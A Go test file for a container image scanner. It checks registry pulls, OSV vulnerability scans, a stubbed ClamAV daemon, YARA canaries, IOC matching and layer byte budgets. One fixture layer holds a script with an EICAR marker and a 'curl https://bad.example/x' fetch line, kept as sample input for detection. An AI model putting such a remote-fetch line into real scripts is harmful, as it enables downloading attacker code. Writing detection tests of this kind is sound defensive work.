package scanner

import (
	"archive/tar"
	"bufio"
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/ORIBData/scrstack/internal/connections"
	"github.com/google/go-containerregistry/pkg/name"
	v1 "github.com/google/go-containerregistry/pkg/v1"
	"github.com/google/go-containerregistry/pkg/v1/empty"
	"github.com/google/go-containerregistry/pkg/v1/mutate"
	"github.com/google/go-containerregistry/pkg/v1/remote"
	"github.com/google/go-containerregistry/pkg/v1/tarball"
)

// Live M6 path: SCRS_TEST_REGISTRY (a plain-HTTP registry holding
// library/alpine:3.19.1), SCRS_TEST_ALPINE_FEED (OSV Alpine all.zip) and the
// pinned scanner. scripts/test_images.sh provides all three.
func TestLiveImageArchiveAndScan(t *testing.T) {
	registry, feed, binary := os.Getenv("SCRS_TEST_REGISTRY"), os.Getenv("SCRS_TEST_ALPINE_FEED"), os.Getenv("SCRS_TEST_OSV_BINARY")
	if registry == "" || feed == "" || binary == "" {
		t.Skip("requires a local registry, the Alpine OSV feed and the pinned scanner")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 4*time.Minute)
	defer cancel()
	if source := os.Getenv("SCRS_TEST_IMAGE_TAR"); source != "" {
		image, err := tarball.ImageFromPath(source, nil)
		if err != nil {
			t.Fatal(err)
		}
		ref, err := name.ParseReference(registry+"/library/alpine:3.19.1", name.Insecure)
		if err != nil {
			t.Fatal(err)
		}
		if err := remote.Write(ref, image, remote.WithContext(ctx)); err != nil {
			t.Fatal("push to test registry failed", err)
		}
	}
	adapters := connections.NewNativeAdapters()
	adapters.RegistryHost = registry
	c := connections.Connection{Provider: "dockerhub", Enabled: true, Config: json.RawMessage(`{"namespace":"library","identifier":"x"}`), Scope: connections.Scope{Include: []string{registry + "/library/*"}}}
	secret := json.RawMessage(`{"token":"unused"}`)
	locator := registry + "/library/alpine"
	if _, err := adapters.ImageArchive(ctx, c, secret, registry+"/other/image", "3.19.1", "", "linux/amd64", 1<<30, &bytes.Buffer{}); err == nil {
		t.Fatal("out-of-scope image pulled")
	}
	if _, err := adapters.ImageArchive(ctx, c, secret, locator, "3.19.1", "", "linux/amd64", 1024, &bytes.Buffer{}); err == nil || !strings.Contains(err.Error(), "SCRS_MAX_IMAGE_BYTES") {
		t.Fatal("size cap not enforced before download", err)
	}
	var archive bytes.Buffer
	digest, err := adapters.ImageArchive(ctx, c, secret, locator, "3.19.1", "", "linux/amd64", 64<<20, &archive)
	if err != nil || !strings.HasPrefix(digest, "sha256:") || archive.Len() < 1<<20 {
		t.Fatal("image not streamed", err, digest, archive.Len())
	}
	byDigest, err := adapters.ImageArchive(ctx, c, secret, locator, "", digest, "linux/amd64", 64<<20, &bytes.Buffer{})
	if err != nil || byDigest != digest {
		t.Fatal("digest pull not stable", err, byDigest)
	}
	db := t.TempDir()
	if err := os.MkdirAll(filepath.Join(db, "osv-scalibr", "Alpine"), 0755); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(feed)
	if err != nil {
		t.Fatal(err)
	}
	_ = os.WriteFile(filepath.Join(db, "osv-scalibr", "Alpine", "all.zip"), data, 0644)
	manifest, _ := json.Marshal(FeedManifest{FetchedAt: time.Now(), Ecosystems: []string{"Alpine"}})
	_ = os.WriteFile(filepath.Join(db, "manifest.json"), manifest, 0644)
	work := t.TempDir()
	path := filepath.Join(work, "image.tar")
	if err := os.WriteFile(path, archive.Bytes(), 0600); err != nil {
		t.Fatal(err)
	}
	clamd := os.Getenv("SCRS_TEST_CLAMD_ADDRESS")
	out, err := Engine{Binary: binary, WorkRoot: work, Database: db, ClamdAddress: clamd}.RunImage(ctx, path)
	if err != nil {
		t.Fatal(err)
	}
	stages := map[string]string{}
	for _, s := range out.Stages {
		stages[s.Name] = s.Status
	}
	// Without a live ClamAV, malware is skipped. With one, every layer file is
	// scanned and the SCRS YARA ruleset is proven loaded (canary).
	wantMalware, wantYARA := "skipped", "skipped"
	if clamd != "" {
		wantMalware, wantYARA = "ok", "ok"
		// The test ClamAV runs without freshclam; stale signatures must show
		// as partial coverage with the posture finding, never as ok.
		for _, f := range out.Findings {
			if f.AdvisoryID == "SCRS-CLAMAV-SIGNATURE-AGE" {
				wantMalware = "partial"
			}
		}
		for _, file := range out.Files {
			if file.Malware == "error" {
				t.Fatal("ClamAV failed on a layer file", file)
			}
		}
	}
	if stages["inventory"] != "ok" || stages["malware"] != wantMalware || stages["yara"] != wantYARA || stages["integrity"] != "ok" || len(out.Components) < 10 || len(out.Findings) == 0 || !json.Valid(out.SBOM) {
		t.Fatal("image assessment incomplete", out.Stages, len(out.Components), len(out.Findings))
	}
	for _, f := range out.Findings {
		if f.Type == "malware" {
			t.Fatal("clean Alpine image flagged as malware", f)
		}
	}
	for _, s := range out.Stages {
		if s.Name == "malware" {
			t.Log("layer coverage:", s.Detail)
		}
	}
	for _, c := range out.Components {
		if strings.HasPrefix(c.Path, "/") || strings.Contains(c.Path, "..") || !strings.HasPrefix(c.PURL, "pkg:apk/") {
			t.Fatal("unexpected image component", c)
		}
	}
	if bytes.Contains(out.SBOM, []byte(path)) {
		t.Fatal("SBOM leaked scanner work path")
	}
	t.Logf("image %s: %d packages, %d findings", digest, len(out.Components), len(out.Findings))
}

// contentClamd answers zVERSION with today's signatures and INSTREAM by
// content: the YARA canary, an EICAR marker, or clean.
func contentClamd(t *testing.T) string {
	t.Helper()
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = listener.Close() })
	go func() {
		for {
			c, err := listener.Accept()
			if err != nil {
				return
			}
			go func() {
				defer c.Close()
				r := bufio.NewReader(c)
				command, err := r.ReadString(0)
				if err != nil {
					return
				}
				if command == "zVERSION\x00" {
					_, _ = io.WriteString(c, "ClamAV 1.4.3/27500/"+time.Now().UTC().Format("Mon Jan _2 15:04:05 2006")+"\x00")
					return
				}
				var body bytes.Buffer
				for {
					var n uint32
					if binary.Read(r, binary.BigEndian, &n) != nil {
						return
					}
					if n == 0 {
						break
					}
					if _, err := io.CopyN(&body, r, int64(n)); err != nil {
						return
					}
				}
				reply := "stream: OK"
				switch {
				case strings.Contains(body.String(), yaraCanary):
					reply = "stream: YARA.SCRS_Canary.UNOFFICIAL FOUND"
				case strings.Contains(body.String(), "EICAR-STANDARD"):
					reply = "stream: Eicar-Signature FOUND"
				}
				_, _ = io.WriteString(c, reply+"\x00")
			}()
		}
	}()
	return listener.Addr().String()
}

func layerOf(t *testing.T, files map[string]string) v1.Layer {
	t.Helper()
	var buf bytes.Buffer
	w := tar.NewWriter(&buf)
	for name, body := range files {
		if err := w.WriteHeader(&tar.Header{Name: name, Mode: 0644, Size: int64(len(body)), Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		_, _ = io.WriteString(w, body)
	}
	_ = w.Close()
	data := buf.Bytes()
	layer, err := tarball.LayerFromOpener(func() (io.ReadCloser, error) { return io.NopCloser(bytes.NewReader(data)), nil })
	if err != nil {
		t.Fatal(err)
	}
	return layer
}

// Layer malware, YARA and IOC coverage (M6): a file deleted by a later layer
// is still inspected, because every pull still downloads it.
func TestImageLayerContentScan(t *testing.T) {
	image, err := mutate.AppendLayers(empty.Image,
		layerOf(t, map[string]string{"app/payload.sh": "#!/bin/sh\n# EICAR-STANDARD fixture\ncurl https://bad.example/x\n", "usr/bin/tool": "clean binary"}),
		layerOf(t, map[string]string{"app/.wh.payload.sh": "", "etc/motd": "welcome"}))
	if err != nil {
		t.Fatal(err)
	}
	work := t.TempDir()
	archive := filepath.Join(work, "image.tar")
	ref, _ := name.NewTag("registry.example/app:scrs")
	if err := tarball.WriteToFile(archive, ref, image); err != nil {
		t.Fatal(err)
	}
	bundle := IndicatorBundle{Version: "v1", Indicators: []Indicator{{ID: "IOC-BAD", Type: "domain", Value: "bad.example", ValidUntil: time.Now().Add(time.Hour)}}}
	e := Engine{ClamdAddress: contentClamd(t), Indicators: &bundle}
	files, findings, stages := e.scanLayers(context.Background(), archive)
	status := map[string]string{}
	for _, s := range stages {
		status[s.Name] = s.Status
	}
	if status["malware"] != "ok" || status["yara"] != "ok" || status["ioc"] != "ok" || status["integrity"] != "ok" {
		t.Fatal("layer stages incomplete", stages)
	}
	ids := map[string]bool{}
	for _, f := range findings {
		ids[f.Type+"/"+f.AdvisoryID+"/"+f.Component.Path] = true
	}
	if !ids["malware/Eicar-Signature/app/payload.sh"] || !ids["ioc_match/IOC-BAD/app/payload.sh"] || len(findings) != 2 {
		t.Fatal("whited-out layer file not inspected", ids)
	}
	if len(files) != 1 || files[0].Path != "app/payload.sh" || files[0].Malware != "infected" {
		t.Fatal("evidence should list only flagged files", files)
	}
	// An unreadable archive must never read as complete coverage.
	_ = os.WriteFile(archive, []byte("not a tar"), 0600)
	_, _, stages = e.scanLayers(context.Background(), archive)
	for _, s := range stages {
		if s.Name != "yara" && s.Status == "ok" {
			t.Fatal("broken archive reported ok", s)
		}
	}
}

// A layer that expands far beyond its compressed size must stop at the byte
// budget and report partial coverage, never ok.
func TestImageLayerBudget(t *testing.T) {
	image, err := mutate.AppendLayers(empty.Image, layerOf(t, map[string]string{"big.bin": strings.Repeat("\x00", 4<<20)}))
	if err != nil {
		t.Fatal(err)
	}
	archive := filepath.Join(t.TempDir(), "image.tar")
	ref, _ := name.NewTag("registry.example/bomb:scrs")
	if err := tarball.WriteToFile(archive, ref, image); err != nil {
		t.Fatal(err)
	}
	_, _, stages := Engine{ClamdAddress: contentClamd(t), MaxLayerBytes: 1 << 20}.scanLayers(context.Background(), archive)
	for _, s := range stages {
		if s.Name == "malware" && s.Status != "partial" {
			t.Fatal("over-budget layer reported", s)
		}
		if s.Name == "integrity" && !strings.Contains(s.Detail, "limit exceeded") {
			t.Fatal("budget not reported", s)
		}
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	_, _, stages = Engine{ClamdAddress: contentClamd(t)}.scanLayers(ctx, archive)
	for _, s := range stages {
		if s.Name == "malware" && s.Status == "ok" {
			t.Fatal("cancelled scan reported ok")
		}
	}
}
